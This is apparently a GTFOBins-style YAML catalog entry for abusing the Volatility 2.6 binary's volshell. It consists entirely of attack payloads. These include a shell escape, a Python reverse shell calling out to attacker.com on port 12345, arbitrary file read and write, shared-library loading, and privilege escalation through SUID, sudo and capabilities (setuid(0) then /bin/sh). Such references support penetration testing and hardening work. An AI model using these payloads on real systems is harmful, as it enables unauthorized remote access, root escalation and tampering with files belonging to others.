---
description: The payloads are compatible with both Python version 2 and 3.
functions:
  shell:
    - code: | 
        ./volatility_2.6_lin64_standalone -f cridex.vmem --profile=WinXPSP2x86 volshell
        \_\_import\_\_("os").system("/bin/sh")
  reverse-shell:
    - description: Run ``netcat -lp 12345`` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        ./volatility_2.6_lin64_standalone -f cridex.vmem --profile=WinXPSP2x86 volshell
        import os,subprocess
        shell = "import sys,socket,os,pty;s=socket.socket();s.connect((%s,int(%s)));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"/bin/sh\\\")"%(repr(os.getenv("RHOST")),repr(os.getenv("RPORT")))
        subprocess.call(["/bin/sh","-c","python3 -c \"%s\""%shell])
  file-write:
    - code: |
        ./volatility_2.6_lin64_standalone -f cridex.vmem --profile=WinXPSP2x86 volshell
        open("file_to_write","w+").write("DATA")
  file-read:
    - code: |
        ./volatility_2.6_lin64_standalone -f cridex.vmem --profile=WinXPSP2x86 volshell
        print(open("file_to_read").read())
  library-load:
    - code: |
        ./volatility_2.6_lin64_standalone -f cridex.vmem --profile=WinXPSP2x86 volshell
        from ctypes import cdll; cdll.LoadLibrary("lib.so")
  suid:
    - code: |
        ./volatility_2.6_lin64_standalone -f cridex.vmem --profile=WinXPSP2x86 volshell
        import os;os.execl("/bin/sh", "sh", "-p")
  sudo:
    - code: |
        ./volatility_2.6_lin64_standalone -f cridex.vmem --profile=WinXPSP2x86 volshell
        import os;os.system("/bin/sh")
  capabilities:
    - code: |
        ./volatility_2.6_lin64_standalone -f cridex.vmem --profile=WinXPSP2x86 volshell
        import os;os.setuid(0);os.system("/bin/sh")
---
